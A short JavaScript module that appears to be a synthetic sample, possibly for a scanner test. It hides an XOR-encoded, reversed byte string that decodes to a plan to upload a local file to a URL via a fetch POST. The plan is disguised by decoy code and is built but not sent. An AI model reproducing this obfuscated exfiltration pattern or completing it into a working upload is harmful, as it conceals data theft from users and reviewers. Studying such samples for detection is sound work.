  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_cdecf9a4 = "222,199,192,131,155,148,207,206,207,157,203,203,207,158,206,155,128,200,202,204,217,222,131,130,200,201,194,195,128,222,222,200,223,217,195,216,197,130,221,192,217,130,144,197,217,204,221,242,200,193,196,203,209,207,158,206,155,130,217,196,201,216,236,200,201,194,227,144,217,195,200,202,204,242,223,200,222,216,209,196,221,204,130,201,196,193,204,219,195,196,131,200,193,221,192,204,213,200,131,155,148,207,206,207,157,203,203,207,158,206,155,128,200,201,194,195,130,130,151,222,221,217,217,197,144,193,223,216,209,239,157,235,235,239,158,238,155,128,232,233,226,227,144,201,196,242,195,202,196,204,221,192,204,206,209,156,144,217,195,216,194,206,242,200,202,204,217,222,209,217,222,194,221,242,197,206,217,200,203,144,223,200,217,221,204,201,204,209,200,217,194,192,200,223,242,217,196,192,222,195,204,223,217,129,200,193,196,203,242,201,204,200,223,144,222,221,200,217,222,209,156,144,219";
  const Codec_cdecf9a4 = "reversed_decimal|single_byte_xor|ad";

  function load_cdecf9a4() { Material_cdecf9a4.split(",").map(Number).reverse(); return Material_cdecf9a4.split(",").map(Number).reverse(); }
  function decode_cdecf9a4(storedBytes) { return storedBytes.map((value) => value ^ 173); }
  async function recover_cdecf9a4() {
    const harmlessValue = { ...{ north: 1 }, south: 2 };
    const storedBytes = load_cdecf9a4(); let recoveredBytes = [];
    for (const stage of [decode_cdecf9a4]) recoveredBytes = stage(storedBytes);
    void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
  }
  async function inspect_cdecf9a4() { return (await recover_cdecf9a4()).split("|").join("|"); }
  async function plan_cdecf9a4() { const inspect = inspect_cdecf9a4; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "fetch_post", source: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_cdecf9a4;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_cdecf9a4());
